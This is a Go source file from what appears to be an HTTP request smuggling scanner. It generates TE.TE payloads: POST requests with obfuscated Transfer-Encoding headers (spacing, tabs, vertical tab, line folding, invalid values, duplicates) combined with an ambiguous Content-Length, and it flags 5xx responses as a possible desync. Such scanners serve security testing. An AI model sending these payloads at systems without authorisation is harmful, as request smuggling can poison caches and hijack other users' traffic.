package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type TETEVector struct{}

func NewTETEVector() *TETEVector {
	return &TETEVector{}
}

func (v *TETEVector) Name() string {
	return "TE.TE (Obfuscated Transfer-Encoding)"
}

func (v *TETEVector) Type() VectorType {
	return "TE.TE"
}

func (v *TETEVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// TE.TE relies on both servers supporting TE, but one can be tricked into ignoring it
	// via obfuscation, falling back to CL.
	// This effectively makes it CL.TE or TE.CL.

	// Obfuscations to try:
	obfuscations := []struct {
		Name string
		Key  string
		Val  string
	}{
		{"Space before colon", "Transfer-Encoding ", "chunked"},
		{"Space after colon", "Transfer-Encoding", " chunked"},
		{"Tab before colon", "Transfer-Encoding\t", "chunked"},
		{"Vertical tab", "Transfer-Encoding", "chunked\v"},
		{"Line folding", "Transfer-Encoding", " \nchunked"}, // Deprecated but some servers support
		{"Cow", "Transfer-Encoding", "cow"},                 // Invalid value
		{"X-Chunked", "Transfer-Encoding", "x-chunked"},
		{"Duplicate with different values", "Transfer-Encoding", "chunked, cow"},
	}

	for _, obs := range obfuscations {
		// We construct a payload that would work if TE is ignored (CL wins)
		// AND a payload that works if TE is obeyed.

		// For simplicity, we generate a generic ambiguous request.
		// The detector will see if it causes a desync (timeout or poisoning).

		req := &client.Request{
			Method: "POST",
			URL:    baseReq.URL,
			Headers: map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
				// We need to set raw headers manually for some of these obfuscations
				// calling client.Do with map might normalize them.
				// We'll rely on our client wrapper trying to preserve them or adding raw header support later.
				// For now, we set them in the map, but note that Go's http client canonicalizes headers.
				// FastHTTP is better but still canonicalizes.
				// Crucial: The `RawHeaders` field in Request (if we add it) or `RawClient`
				// is needed for "Transfer-Encoding : chunked".
			},
			TransferEncoding: "chunked",        // We act as if we are chunked
			ContentLength:    4,                // Ambigous CL
			Body:             []byte("5c\r\n"), // Start of chunk
		}

		// Add the specific obfuscated header.
		// Since standard maps don't allow duplicate keys or spaces in keys easily given Go strictness,
		// we might need to update the Request struct to support a list of raw headers.
		// For now, we use a special prefix or just put it in the map and hope the client handles it?
		// No, standard library will reject "Transfer-Encoding ".
		// We need the `RawClient` or a specialized mechanism.

		// Let's assume for this implementation we just define the intent.
		// Real implementation requires raw socket writer (like RawClient).

		// TODO: Integrate with RawClient for these specific headers.
		// Check how we can pass this to client.

		// Let's rely on the RawHeaders string we added to client.Request earlier!
		req.RawHeaders = fmt.Sprintf("%s: %s\r\n", obs.Key, obs.Val)

		payloads = append(payloads, req)
	}

	return payloads
}

func (v *TETEVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 500
}
